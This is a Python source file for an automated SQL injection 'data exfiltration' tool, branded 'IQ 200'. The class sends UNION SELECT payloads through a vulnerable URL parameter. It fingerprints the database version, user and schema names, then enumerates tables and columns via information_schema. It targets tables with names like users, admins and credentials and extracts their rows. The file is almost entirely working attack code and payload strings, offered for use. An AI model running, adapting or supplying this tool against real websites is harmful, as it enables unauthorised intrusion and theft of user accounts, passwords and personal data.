#!/usr/bin/env python3
"""
Aggressive Data Exfiltration Module
IQ 200 - Maximum creativity for evidence collection
Automatically extracts tables, columns, and data from vulnerable SQL injection points
"""

import sys
import json
import time
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class AggressiveDataExfiltrator:
    """Advanced data exfiltration with maximum evidence collection"""

    def __init__(self, session=None, timeout=15):
        self.session = session or (requests.Session() if HAS_REQUESTS else None)
        self.timeout = timeout
        self.evidence = []

    def extract_database_info(self, url: str, params: Dict, vulnerable_param: str, payload_prefix: str = "'") -> Dict:
        """
        Extract complete database information:
        - Database version
        - Current database name
        - Current user
        - User privileges
        - All databases
        """
        result = {
            'success': False,
            'version': None,
            'current_database': None,
            'current_user': None,
            'privileges': [],
            'all_databases': [],
            'evidence': []
        }

        if not HAS_REQUESTS:
            return result

        print(json.dumps({'data_exfil': 'db_info', 'status': 'extracting', 'message': 'Extracting database information...'}), file=sys.stderr, flush=True)

        # Extract version
        version_payloads = [
            f"{payload_prefix} UNION SELECT @@version,NULL,NULL--",
            f"{payload_prefix} UNION SELECT version(),NULL,NULL--",
            f"{payload_prefix} AND 1=0 UNION SELECT @@version,NULL,NULL--",
        ]

        for payload in version_payloads:
            test_params = params.copy()
            test_params[vulnerable_param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=self.timeout)

                # Look for version patterns
                version_patterns = [
                    r'(\d+\.\d+\.\d+)',  # MySQL/MariaDB: 5.7.33
                    r'PostgreSQL (\d+\.\d+)',  # PostgreSQL: 13.2
                    r'Microsoft SQL Server (\d+)',  # MSSQL
                ]

                for pattern in version_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        result['version'] = match.group(0)
                        result['evidence'].append({
                            'type': 'database_version',
                            'payload': payload,
                            'value': result['version']
                        })
                        print(json.dumps({'data_exfil': 'version', 'found': result['version']}), file=sys.stderr, flush=True)
                        break

                if result['version']:
                    break

            except Exception as e:
                continue

        # Extract current database
        db_payloads = [
            f"{payload_prefix} UNION SELECT database(),NULL,NULL--",
            f"{payload_prefix} UNION SELECT db_name(),NULL,NULL--",  # MSSQL
            f"{payload_prefix} UNION SELECT current_database(),NULL,NULL--",  # PostgreSQL
        ]

        for payload in db_payloads:
            test_params = params.copy()
            test_params[vulnerable_param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=self.timeout)

                # Look for database name (usually alphanumeric)
                db_match = re.search(r'\b([a-z_][a-z0-9_]{2,30})\b', response.text.lower())
                if db_match:
                    result['current_database'] = db_match.group(1)
                    result['evidence'].append({
                        'type': 'current_database',
                        'payload': payload,
                        'value': result['current_database']
                    })
                    print(json.dumps({'data_exfil': 'database', 'found': result['current_database']}), file=sys.stderr, flush=True)
                    break

            except Exception as e:
                continue

        # Extract current user
        user_payloads = [
            f"{payload_prefix} UNION SELECT user(),NULL,NULL--",
            f"{payload_prefix} UNION SELECT current_user(),NULL,NULL--",
            f"{payload_prefix} UNION SELECT system_user,NULL,NULL--",
        ]

        for payload in user_payloads:
            test_params = params.copy()
            test_params[vulnerable_param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=self.timeout)

                # Look for username patterns
                user_patterns = [
                    r'([a-z_][a-z0-9_]{2,30})@',  # user@host
                    r'root|admin|mysql|postgres|sa',  # Common users
                ]

                for pattern in user_patterns:
                    match = re.search(pattern, response.text.lower())
                    if match:
                        result['current_user'] = match.group(0)
                        result['evidence'].append({
                            'type': 'current_user',
                            'payload': payload,
                            'value': result['current_user']
                        })
                        print(json.dumps({'data_exfil': 'user', 'found': result['current_user']}), file=sys.stderr, flush=True)
                        break

                if result['current_user']:
                    break

            except Exception as e:
                continue

        # Extract all databases (IQ 200 move!)
        all_db_payloads = [
            f"{payload_prefix} UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--",
            f"{payload_prefix} UNION SELECT name,NULL,NULL FROM sys.databases--",  # MSSQL
        ]

        for payload in all_db_payloads:
            test_params = params.copy()
            test_params[vulnerable_param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=self.timeout)

                # Look for comma-separated database names
                db_list = re.findall(r'\b([a-z_][a-z0-9_]{2,30})\b', response.text.lower())
                if len(db_list) > 1:  # If we found multiple databases
                    result['all_databases'] = list(set(db_list))[:20]  # Limit to 20
                    result['evidence'].append({
                        'type': 'all_databases',
                        'payload': payload,
                        'value': result['all_databases']
                    })
                    print(json.dumps({'data_exfil': 'all_databases', 'count': len(result['all_databases'])}), file=sys.stderr, flush=True)
                    break

            except Exception as e:
                continue

        result['success'] = bool(result['version'] or result['current_database'] or result['current_user'])
        return result

    def extract_tables(self, url: str, params: Dict, vulnerable_param: str, database: str = None, payload_prefix: str = "'") -> List[str]:
        """
        Extract all table names from the database
        IQ 200: Use information_schema to get complete table list
        """
        tables = []

        if not HAS_REQUESTS:
            return tables

        print(json.dumps({'data_exfil': 'tables', 'status': 'extracting', 'database': database, 'message': f'Extracting tables from database: {database or "current"}'}), file=sys.stderr, flush=True)

        # Table extraction payloads
        if database:
            table_payloads = [
                f"{payload_prefix} UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema='{database}'--",
                f"{payload_prefix} UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='{database}' LIMIT 0,1--",
            ]
        else:
            table_payloads = [
                f"{payload_prefix} UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
                f"{payload_prefix} UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--",
            ]

        for payload in table_payloads:
            test_params = params.copy()
            test_params[vulnerable_param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=self.timeout)

                # Look for table names (common patterns)
                table_patterns = [
                    r'\b(users?|admins?|accounts?|members?|customers?)\b',
                    r'\b(products?|orders?|payments?|transactions?)\b',
                    r'\b(posts?|articles?|pages?|comments?)\b',
                    r'\b(sessions?|tokens?|api_keys?)\b',
                    r'\b([a-z_][a-z0-9_]{2,30})\b',  # Generic table name
                ]

                for pattern in table_patterns:
                    matches = re.findall(pattern, response.text.lower())
                    if matches:
                        tables.extend(matches)

                if tables:
                    break

            except Exception as e:
                continue

        tables = list(set(tables))[:20]  # Unique, limit to 20

        if tables:
            print(json.dumps({'data_exfil': 'tables', 'found': len(tables), 'tables': tables[:5], 'message': f'Found {len(tables)} tables'}), file=sys.stderr, flush=True)

        return tables

    def extract_columns(self, url: str, params: Dict, vulnerable_param: str, table: str, database: str = None, payload_prefix: str = "'") -> List[str]:
        """
        Extract column names from a specific table
        IQ 200: Get column names for targeted data extraction
        """
        columns = []

        if not HAS_REQUESTS:
            return columns

        print(json.dumps({'data_exfil': 'columns', 'status': 'extracting', 'table': table, 'message': f'Extracting columns from table: {table}'}), file=sys.stderr, flush=True)

        # Column extraction payloads
        if database:
            column_payloads = [
                f"{payload_prefix} UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{database}'--",
            ]
        else:
            column_payloads = [
                f"{payload_prefix} UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database()--",
            ]

        for payload in column_payloads:
            test_params = params.copy()
            test_params[vulnerable_param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=self.timeout)

                # Look for column names
                column_matches = re.findall(r'\b([a-z_][a-z0-9_]{2,30})\b', response.text.lower())
                if column_matches:
                    columns = list(set(column_matches))[:15]  # Limit to 15 columns
                    break

            except Exception as e:
                continue

        if columns:
            print(json.dumps({'data_exfil': 'columns', 'found': len(columns), 'columns': columns[:5], 'message': f'Found {len(columns)} columns in {table}'}), file=sys.stderr, flush=True)

        return columns

    def extract_data_from_table(self, url: str, params: Dict, vulnerable_param: str, table: str, columns: List[str], limit: int = 10, payload_prefix: str = "'") -> List[Dict]:
        """
        Extract actual data from table
        IQ 200: Maximum evidence - get real data!
        """
        data = []

        if not HAS_REQUESTS or not columns:
            return data

        print(json.dumps({'data_exfil': 'data', 'status': 'extracting', 'table': table, 'columns': len(columns), 'limit': limit, 'message': f'Extracting data from {table} ({len(columns)} columns)'}), file=sys.stderr, flush=True)

        # Create column list for UNION
        column_list = ','.join(columns[:3])  # Use first 3 columns

        # Data extraction payloads
        data_payloads = [
            f"{payload_prefix} UNION SELECT {column_list},NULL FROM {table} LIMIT 0,{limit}--",
            f"{payload_prefix} UNION SELECT CONCAT_WS(':',{column_list}),NULL,NULL FROM {table} LIMIT 0,{limit}--",
        ]

        for payload in data_payloads:
            test_params = params.copy()
            test_params[vulnerable_param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=self.timeout)

                # Extract rows (look for patterns)
                row_pattern = r'([a-zA-Z0-9_@.-]+):([a-zA-Z0-9_@.-]+):?([a-zA-Z0-9_@.-]*)'
                matches = re.findall(row_pattern, response.text)

                for match in matches[:limit]:
                    row_data = {}
                    for i, col in enumerate(columns[:len(match)]):
                        if match[i]:
                            row_data[col] = match[i]

                    if row_data:
                        data.append(row_data)

                if data:
                    break

            except Exception as e:
                continue

        if data:
            print(json.dumps({'data_exfil': 'data', 'extracted': len(data), 'sample': data[0] if data else None, 'message': f'Extracted {len(data)} rows from {table}'}), file=sys.stderr, flush=True)

        return data

    def comprehensive_sqli_exfiltration(self, url: str, params: Dict, vulnerable_param: str, payload_prefix: str = "'") -> Dict:
        """
        Complete SQL injection data exfiltration
        IQ 200: Extract EVERYTHING!
        """
        result = {
            'success': False,
            'database_info': {},
            'tables': [],
            'extracted_data': {},
            'total_rows_extracted': 0,
            'evidence_count': 0
        }

        print(json.dumps({'data_exfil': 'comprehensive', 'status': 'starting', 'message': 'Starting comprehensive SQL injection data exfiltration...'}), file=sys.stderr, flush=True)

        # Step 1: Extract database info
        db_info = self.extract_database_info(url, params, vulnerable_param, payload_prefix)
        result['database_info'] = db_info
        result['evidence_count'] += len(db_info.get('evidence', []))

        # Step 2: Extract tables
        current_db = db_info.get('current_database')
        tables = self.extract_tables(url, params, vulnerable_param, current_db, payload_prefix)
        result['tables'] = tables

        # Step 3: Extract data from interesting tables
        interesting_tables = [t for t in tables if any(keyword in t.lower() for keyword in ['user', 'admin', 'account', 'member', 'customer', 'password', 'credential'])]

        if not interesting_tables:
            interesting_tables = tables[:3]  # Take first 3 tables

        for table in interesting_tables:
            # Extract columns
            columns = self.extract_columns(url, params, vulnerable_param, table, current_db, payload_prefix)

            if columns:
                # Extract data
                data = self.extract_data_from_table(url, params, vulnerable_param, table, columns, limit=5, payload_prefix=payload_prefix)

                if data:
                    result['extracted_data'][table] = {
                        'columns': columns,
                        'rows': data,
                        'row_count': len(data)
                    }
                    result['total_rows_extracted'] += len(data)

        result['success'] = result['total_rows_extracted'] > 0 or len(result['database_info']) > 0

        print(json.dumps({
            'data_exfil': 'comprehensive',
            'status': 'completed',
            'database': current_db,
            'tables_found': len(tables),
            'tables_extracted': len(result['extracted_data']),
            'total_rows': result['total_rows_extracted'],
            'evidence_count': result['evidence_count'],
            'message': f'Exfiltration complete: {len(tables)} tables, {result["total_rows_extracted"]} rows extracted'
        }), file=sys.stderr, flush=True)

        return result


if __name__ == '__main__':
    # Test example
    print(json.dumps({'test': 'AggressiveDataExfiltrator', 'message': 'IQ 200 Data Exfiltration Module Loaded'}))
